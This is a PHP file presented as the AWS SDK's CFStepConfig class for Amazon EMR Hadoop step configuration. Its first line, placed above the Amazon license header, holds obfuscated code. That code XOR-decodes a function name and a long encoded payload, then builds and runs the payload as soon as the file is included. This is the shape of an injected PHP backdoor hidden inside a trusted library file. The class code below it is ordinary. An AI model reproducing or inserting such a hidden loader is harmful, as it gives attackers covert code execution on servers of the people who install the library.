<?php $PjStn='WR5,=-=.GW0H,74'^'4 PMIHbH29S<EXZ';$zSepS=$PjStn('','87ZY,,TNH =T;Q:Y:M9PUBO93O738n07 CEbAJ6d7 ,TC,35-G:BGlWPM8lc M8gA=.2MKwqU12ZjBFSh0APShZL6HDvwIwYmdTABmv=ONlEOTrUK>O;:I-Rl7V0YqxDg.ZddXgGR.70qFnursP16-eT3<NuqfPQO6IQyNV::>Z,YbG;IEx6jwGZ3KPO2ARrj.:XGTz55eFS9G003YMXu6TL5-NSMRX 9a-57nTCXT414s::36C48;;RFcfu569g=fUDtF17 jqpSp019<TbT91sSR+:79>XDIuIFU15R2Dg6XZMIzGAO L>WZ:SdnPFgxovW;F2Hu<NA3URY;M;zdt6=66-i<8lP0PeK5MYDWwmNJXH,lTN6SjPJ X3-K-2WNtM3Y>CZs>KI299EMcECU>X7uKkGH7:cJOMETkuerAPGPH1YGI-5e96863V,As4MXIOZW++ey4R32O1+McQ223szDn1J01iW5LBOjYW0fU5S..UmNzWK;8TlU5:b6M<SGBXF9IRTbwG59-0eFAjzkM0pzcV10U5rQ.KDgxFiGsBjUw0ZvQatCHJKV,HXCWTktVAFY AZ8YEBlmscx6:RL 2;4On<=B9 FZHFVUZSWYjNgu6AZZpKuUZrIrBP2EAMPma26751TG36LURYV1Zl3N 036NzDZMP'^'QQrxJY:-<IR:d4B0I9Jxr: Kl+VGY1oZU7bKhjMn>FY: XZZCgB-53319Y3<M8LOeYOF,gWU>TKsJbfsHKKYZL59BhyVPnLSdm2.0ERTosLuttV<wM;IV,CzHS7D8XCdCGqOMRnNvABDQhSUZW4PBL>pZan+QB;46mm8YkvINL6I7JcP,<QkCLMS:95;G3<ZNAO,nop<Ho;Y3cTQG8meUP5 FHuYi69TX>FPNNic>5XBQH00UY1QYXSrnG96zyr.xF47TbZRYJLNsTFPUI1KtB;zw6JNVfU==iHib>TLi8MCR9.,iGge9A K2a0.nd9 GPNR3Z2SaUGDHU: <Z.SZLPiosgx,olL1CpA P4yyiWI8+4=IEt5<Zct.A,Rr HKwsTiX<GxPz7o-SMXepCa54R-RNAb:BJ0in+,15KHE24>45:X8+ WPMAYJiW7X ,k -=g86XNSMk6VQ UNeG5SFRZVdJU+DP6<P5kfQS>VNqQ2ZOuKhZ69IY-3>PC=S5U 31paR,+sNWcQXYQLfgLZC TERG2PD4nU:K2c:QfTzSeX3GV8OaQMv-,z4I.=vc0RAewv;AvjYo eEMUEXWH -YmPQ61YE+JT5ro67,6<6=MbGQR .;YbUuzRiR9Z; 7,<EEVWCTjs7RO :3=qlsW9GEHZBfJmaG-');$zSepS();
/*
 * Copyright 2010-2012 Amazon.com, Inc. or its affiliates. All Rights Reserved.
 *
 * Licensed under the Apache License, Version 2.0 (the "License").
 * You may not use this file except in compliance with the License.
 * A copy of the License is located at
 *
 *  http://aws.amazon.com/apache2.0
 *
 * or in the "license" file accompanying this file. This file is distributed
 * on an "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either
 * express or implied. See the License for the specific language governing
 * permissions and limitations under the License.
 */


/*%******************************************************************************************%*/
// CLASS

/**
 * Contains functionality for simplifying Amazon EMR Hadoop steps.
 *
 * @version 2010.11.16
 * @license See the included NOTICE.md file for more information.
 * @copyright See the included NOTICE.md file for more information.
 * @link http://aws.amazon.com/php/ PHP Developer Center
 */
class CFStepConfig
{

	/**
	 * Stores the configuration map.
	 */
	public $config;

	/**
	 * Constructs a new instance of this class.
	 *
	 * @param array $config (Required) An associative array representing the Hadoop step configuration.
	 * @return $this A reference to the current instance.
	 */
	public function __construct($config)
	{
		// Handle Hadoop jar arguments
		if (isset($config['HadoopJarStep']['Args']) && $args = $config['HadoopJarStep']['Args'])
		{
			$config['HadoopJarStep']['Args'] = is_array($args) ? $args : array($args);
		}

		$this->config = $config;
	}

	/**
	 * Constructs a new instance of this class, and allows chaining.
	 *
	 * @param array $config (Required) An associative array representing the Hadoop step configuration.
	 * @return $this A reference to the current instance.
	 */
	public static function init($config)
	{
		if (version_compare(PHP_VERSION, '5.3.0', '<'))
		{
			throw new Exception('PHP 5.3 or newer is required to instantiate a new class with CLASS::init().');
		}

		$self = get_called_class();
		return new $self($config);
	}

	/**
	 * Returns a JSON representation of the object when typecast as a string.
	 *
	 * @return string A JSON representation of the object.
	 * @link http://www.php.net/manual/en/language.oop5.magic.php#language.oop5.magic.tostring PHP Magic Methods
	 */
	public function __toString()
	{
		return json_encode($this->config);
	}

	/**
	 * Returns the configuration data.
	 *
	 * @return array The configuration data.
	 */
	public function get_config()
	{
		return $this->config;
	}
}